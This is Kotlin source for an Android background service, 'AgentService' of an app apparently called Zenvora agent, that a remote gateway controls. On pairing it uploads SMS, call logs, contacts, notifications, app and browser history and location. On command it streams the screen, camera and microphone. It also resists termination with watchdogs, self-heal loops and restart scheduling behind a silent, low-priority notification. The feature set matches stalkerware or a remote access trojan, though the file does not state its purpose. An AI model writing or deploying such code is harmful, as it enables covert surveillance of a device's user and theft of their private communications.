package com.zenvora.agent.service

import android.app.Notification
import android.app.PendingIntent
import android.app.Service
import android.content.Intent
import android.content.pm.ServiceInfo
import android.database.ContentObserver
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.ConnectivityManager
import android.net.Network
import android.net.NetworkCapabilities
import android.net.NetworkRequest
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import android.provider.Telephony
import android.util.Log
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import com.zenvora.agent.AgentPrefs
import com.zenvora.agent.R
import com.zenvora.agent.activity.MainActivity
import com.zenvora.agent.gateway.ControlClient
import com.zenvora.agent.gateway.GatewayClient
import com.zenvora.agent.gateway.MediaClient
import com.zenvora.agent.manager.ActivityLogMonitor
import com.zenvora.agent.manager.BrowserHistoryStore
import com.zenvora.agent.manager.CallLogManager
import com.zenvora.agent.manager.ContactsManager
import com.zenvora.agent.manager.DeviceInfoManager
import com.zenvora.agent.manager.LocationHelper
import com.zenvora.agent.manager.SMSManager
import com.zenvora.agent.protocol.ZVProtocol
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.Job
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.launch
import org.json.JSONArray
import org.json.JSONObject

class AgentService : Service() {
    
    private val TAG = "AgentService"
    private lateinit var gatewayClient: GatewayClient
    private lateinit var controlClient: ControlClient
    private lateinit var screenMedia: MediaClient
    private lateinit var cameraMedia: MediaClient
    private lateinit var commandHandler: CommandHandler
    private val scope = CoroutineScope(Dispatchers.Default + Job())
    private val deviceInfo by lazy { DeviceInfoManager(this) }
    private val locationHelper by lazy { LocationHelper(this) }
    private var activityMonitor: ActivityLogMonitor? = null
    private var statusJob: Job? = null
    private var callObserver: ContentObserver? = null
    private var smsObserver: ContentObserver? = null
    private var networkCallback: ConnectivityManager.NetworkCallback? = null
    private var collectorsStarted = false
    private var screenLive = false
    private var cameraLive = false
    private var micLive = false
    private val mainHandler = Handler(Looper.getMainLooper())
    private var healJob: Job? = null

    override fun onCreate() {
        super.onCreate()
        createServiceNotificationChannel()
        startInForeground()
        KeepAlive.schedule(this)
        KeepAliveWorker.schedule(this)
        ConnectionHealer.scheduleWatchdog(this)
        setupClients()
        registerNetworkCallback()
        startHealLoop()
    }
    
    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        startInForeground()
        if (intent?.action == ACTION_SCREEN_PERMISSION) {
            val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, RESULT_CANCELED)
            val data = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                intent.getParcelableExtra(EXTRA_PERMISSION_DATA, Intent::class.java)
            } else {
                @Suppress("DEPRECATION")
                intent.getParcelableExtra(EXTRA_PERMISSION_DATA)
            }
            if (resultCode == RESULT_OK && data != null) {
                val manager = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                val projection: MediaProjection? = manager.getMediaProjection(resultCode, data)
                if (projection != null && ::commandHandler.isInitialized) {
                    screenLive = true
                    updateMediaForeground()
                    commandHandler.attachScreenProjection(projection)
                }
            }
        }
        if (!::gatewayClient.isInitialized) setupClients()
        else {
            gatewayClient.ensureConnected()
            if (::controlClient.isInitialized) controlClient.ensureConnected()
        }
        return START_STICKY
    }

    override fun onTaskRemoved(rootIntent: Intent?) {
        super.onTaskRemoved(rootIntent)
        ConnectionHealer.heal(this, "task_removed")
        ConnectionHealer.scheduleWatchdog(this)
    }
    
    override fun onBind(intent: Intent?): IBinder? = null
    
    override fun onDestroy() {
        AgentPrefs.setConnected(this, false)
        ZenvoraNotificationListener.sink = null
        BrowserHistoryStore.listener = null
        activityMonitor?.stop()
        locationHelper.stop()
        unregisterObservers()
        unregisterNetworkCallback()
        statusJob?.cancel()
        healJob?.cancel()
        mainHandler.removeCallbacksAndMessages(null)
        if (::gatewayClient.isInitialized) gatewayClient.disconnect()
        if (::controlClient.isInitialized) controlClient.disconnect()
        if (::screenMedia.isInitialized) screenMedia.disconnect()
        if (::cameraMedia.isInitialized) cameraMedia.disconnect()
        if (::commandHandler.isInitialized) commandHandler.stopAll()
        // Ask OS / WorkManager to bring us back after unexpected death.
        ConnectionHealer.scheduleWatchdog(this)
        KeepAliveWorker.schedule(this)
        scope.cancel()
        super.onDestroy()
    }
    
    private fun setupClients() {
        val token = AgentPrefs.agentToken(this)
        val deviceId = AgentPrefs.deviceId(this)
        // Always derive WS from API host — HTTP beat can work while a stale paired gateway URL is dead.
        val gatewayUrl = GatewayClient.normalizeGatewayUrl(AgentPrefs.apiUrl(this))
        AgentPrefs.setGatewayUrl(this, gatewayUrl)
        if (token.isBlank()) {
            Log.w(TAG, "Not paired — stopping")
            stopSelf()
            return
        }

            commandHandler = CommandHandler(this)
        gatewayClient = GatewayClient(gatewayUrl, deviceId, token)
        controlClient = ControlClient(
            GatewayClient.controlUrlFromGateway(gatewayUrl),
            deviceId,
            token
        )
        val mediaUrl = GatewayClient.mediaUrlFromGateway(gatewayUrl)
        screenMedia = MediaClient(mediaUrl, deviceId, token, "screen")
        cameraMedia = MediaClient(mediaUrl, deviceId, token, "camera")

        commandHandler.setItemsCallback { kind, items ->
            controlClient.sendItems(kind, items)
        }
        commandHandler.setMediaCallback { channel, kind, jpeg ->
            val wrapped = ZVProtocol.wrapMediaPayload(kind, jpeg)
            if (channel == "camera") cameraMedia.sendFrame(wrapped) else screenMedia.sendFrame(wrapped)
        }
        commandHandler.setAckCallback { ack ->
            gatewayClient.sendJson(ack)
        }
        commandHandler.setMediaControlCallback { channel, start ->
            when (channel) {
                "screen" -> {
                    screenLive = start
                    updateMediaForeground()
                    if (start) screenMedia.connect() else screenMedia.disconnect()
                }
                "camera" -> {
                    cameraLive = start
                    updateMediaForeground()
                    if (start) cameraMedia.connect() else cameraMedia.disconnect()
                }
                "mic" -> {
                    micLive = start
                    updateMediaForeground()
                }
            }
        }
        commandHandler.setHistoryCallback { command, items, incremental ->
            sendHistory(command, items, incremental)
        }

        ZenvoraNotificationListener.sink = { item ->
            com.zenvora.agent.manager.EventQueue.add(this, "FETCH_SYSTEM_NOTIFICATIONS", item)
            SessionPinger.requestFlushDebounced(this)
        }

        gatewayClient.connect(
            onCommand = { action, payload -> commandHandler.handleAction(action, payload) },
            onConnectionChange = { connected ->
                AgentPrefs.setConnected(this, connected)
                AgentPrefs.setEnabled(this, connected || AgentPrefs.isEnabled(this))
                if (connected) {
                    onGatewayReady(deviceId)
                } else {
                    statusJob?.cancel()
                    statusJob = null
                    // Self-heal WS after drop
                    scope.launch {
                        delay(800)
                        if (::gatewayClient.isInitialized) gatewayClient.ensureConnected()
                        if (::controlClient.isInitialized) controlClient.ensureConnected()
                    }
                }
            }
        )
        controlClient.connect { frame -> commandHandler.handleFrame(frame) }
    }

    private fun onGatewayReady(deviceId: String) {
        locationHelper.start()
        sendStatus()
        startStatusLoop()
        screenMedia.connect()
        cameraMedia.connect()
        commandHandler.handleAction("LIST_DISPLAYS", JSONObject())
        commandHandler.handleAction("LIST_CAMERAS", JSONObject())
        commandHandler.handleAction("LIST_AUDIO_DEVICES", JSONObject())
        startCollectors(deviceId)
        val recent = BrowserHistoryStore.recent(40)
        if (recent.length() > 0) sendHistory("FETCH_BROWSER_HISTORY", recent, true)
    }

    private fun startCollectors(deviceId: String) {
        BrowserHistoryStore.load(this)
        BrowserHistoryStore.listener = { entry ->
            com.zenvora.agent.manager.EventQueue.add(this, "FETCH_BROWSER_HISTORY", entry)
            SessionPinger.requestFlushDebounced(this)
        }
        if (collectorsStarted) return
        collectorsStarted = true
        scope.launch {
            val apps = com.zenvora.agent.manager.AppActivityManager(this@AgentService).fetch()
            if (apps.length() > 0) sendHistory("FETCH_APP_HISTORY", apps, true)
            val calls = CallLogManager(this@AgentService).fetch()
            if (calls.length() > 0) sendHistory("FETCH_CALL_LOGS", calls, true)
            val sms = SMSManager(this@AgentService).fetch()
            if (sms.length() > 0) sendHistory("FETCH_SMS_MESSAGES", sms, true)
            val contacts = ContactsManager(this@AgentService).fetch()
            if (contacts.length() > 0) sendHistory("FETCH_CONTACTS", contacts, true)
            val browsers = com.zenvora.agent.manager.BrowserHistoryManager(this@AgentService).fetch()
            if (browsers.length() > 0) sendHistory("FETCH_BROWSER_HISTORY", browsers, true)
        }
    }

    private fun sendHistory(command: String, items: JSONArray, incremental: Boolean) {
        gatewayClient.sendJson(
            JSONObject()
                .put("command", command)
                .put("success", true)
                .put("incremental", incremental)
                .put("data", items)
        )
    }

    private fun sendStatus() {
        val packet = deviceInfo.buildStatusPacket(AgentPrefs.deviceId(this))
        locationHelper.last?.let { loc ->
            packet.put("geolocation", JSONObject().put("latitude", loc.latitude).put("longitude", loc.longitude))
            packet.put("latitude", loc.latitude)
            packet.put("longitude", loc.longitude)
        }
        gatewayClient.sendDeviceStatus(packet)
    }

    /** HTTP android-beat backup when WS is flaky; keeps dashboard online up to 5 min. */
    private fun startStatusLoop() {
        statusJob?.cancel()
        statusJob = scope.launch {
            var tick = 0
            while (true) {
                delay(60_000)
                tick++
                if (::gatewayClient.isInitialized && gatewayClient.isConnected()) {
                    sendStatus()
                }
                // Every 2 min: HTTP beat (survives brief WS drops / Doze)
                if (tick % 2 == 0) {
                    SessionPinger.requestFlush(this@AgentService)
                }
            }
        }
    }

    private fun unregisterObservers() {
        callObserver?.let { contentResolver.unregisterContentObserver(it) }
        smsObserver?.let { contentResolver.unregisterContentObserver(it) }
        callObserver = null
        smsObserver = null
    }

    private fun unregisterNetworkCallback() {
        val callback = networkCallback ?: return
        networkCallback = null
        try {
            val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
            cm.unregisterNetworkCallback(callback)
        } catch (_: Exception) {
        }
    }

    private fun startInForeground() {
        createServiceNotificationChannel()
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                ServiceCompat.startForeground(
                    this,
                    NOTIFICATION_ID,
                    notification,
                    idleForegroundTypes()
                )
            } else {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (_: Exception) {
        }
    }

    private fun idleForegroundTypes(): Int {
        var types = ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            val fine = checkSelfPermission(android.Manifest.permission.ACCESS_FINE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
            val coarse = checkSelfPermission(android.Manifest.permission.ACCESS_COARSE_LOCATION) ==
                android.content.pm.PackageManager.PERMISSION_GRANTED
            if (fine || coarse) {
                types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
        }
        return types
    }

    private fun updateMediaForeground() {
        createServiceNotificationChannel()
        val notification = buildNotification()
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                var types = idleForegroundTypes()
                if (screenLive) types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                if (cameraLive && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
                }
                if (micLive && Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    types = types or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
                }
                ServiceCompat.startForeground(this, NOTIFICATION_ID, notification, types)
            } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForeground(NOTIFICATION_ID, notification)
            }
        } catch (_: Exception) {
        }
    }

    private fun registerNetworkCallback() {
        if (networkCallback != null) return
        val cm = getSystemService(CONNECTIVITY_SERVICE) as ConnectivityManager
        val callback = object : ConnectivityManager.NetworkCallback() {
            override fun onAvailable(network: Network) {
                Log.i(TAG, "Network available — reconnect")
                if (::gatewayClient.isInitialized) gatewayClient.reconnectNow()
                if (::controlClient.isInitialized) controlClient.ensureConnected()
                SessionPinger.requestFlush(this@AgentService)
            }

            override fun onLost(network: Network) {
                Log.w(TAG, "Network lost")
            }

            override fun onCapabilitiesChanged(network: Network, capabilities: NetworkCapabilities) {
                if (capabilities.hasCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)) {
                    if (::gatewayClient.isInitialized) gatewayClient.ensureConnected()
                    if (::controlClient.isInitialized) controlClient.ensureConnected()
                }
            }
        }
        networkCallback = callback
        try {
            val request = NetworkRequest.Builder()
                .addCapability(NetworkCapabilities.NET_CAPABILITY_INTERNET)
                .build()
            cm.registerNetworkCallback(request, callback)
        } catch (e: Exception) {
            Log.w(TAG, "Network callback: ${e.message}")
            networkCallback = null
        }
    }

    /** Periodic self-heal while FGS is alive. */
    private fun startHealLoop() {
        healJob?.cancel()
        healJob = scope.launch {
            var cycle = 0
            while (true) {
                delay(15_000)
                cycle++
                if (::gatewayClient.isInitialized && !gatewayClient.isConnected()) {
                    gatewayClient.ensureConnected()
                }
                if (::controlClient.isInitialized) controlClient.ensureConnected()
                if (cycle % 4 == 0) {
                    SessionPinger.requestFlush(this@AgentService)
                }
                ConnectionHealer.scheduleWatchdog(this@AgentService)
            }
        }
    }

    private fun buildNotification(): Notification {
        val openApp = PendingIntent.getActivity(
            this,
            0,
            Intent(this, MainActivity::class.java),
            KeepAlive.pendingFlags()
        )
        val text = if (screenLive || cameraLive || micLive) {
            getString(R.string.notification_media_text)
        } else {
            getString(R.string.notification_text)
        }
        return NotificationCompat.Builder(this, NotificationGuard.SERVICE_CHANNEL_ID)
            .setContentTitle(getString(R.string.notification_title))
            .setContentText(text)
            .setSmallIcon(R.drawable.ic_zenvora_rings)
            .setContentIntent(openApp)
            .setOngoing(true)
            .setOnlyAlertOnce(true)
            .setSilent(true)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setVisibility(NotificationCompat.VISIBILITY_PUBLIC)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setForegroundServiceBehavior(NotificationCompat.FOREGROUND_SERVICE_IMMEDIATE)
            .build()
    }
    
    private fun createServiceNotificationChannel() {
        KeepAlive.ensureChannel(this)
    }

    companion object {
        const val ACTION_SCREEN_PERMISSION = "com.zenvora.agent.SCREEN_PERMISSION"
        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_PERMISSION_DATA = "permission_data"
        private const val NOTIFICATION_ID = 1001
        private const val RESULT_CANCELED = android.app.Activity.RESULT_CANCELED
        private const val RESULT_OK = android.app.Activity.RESULT_OK
    }
}
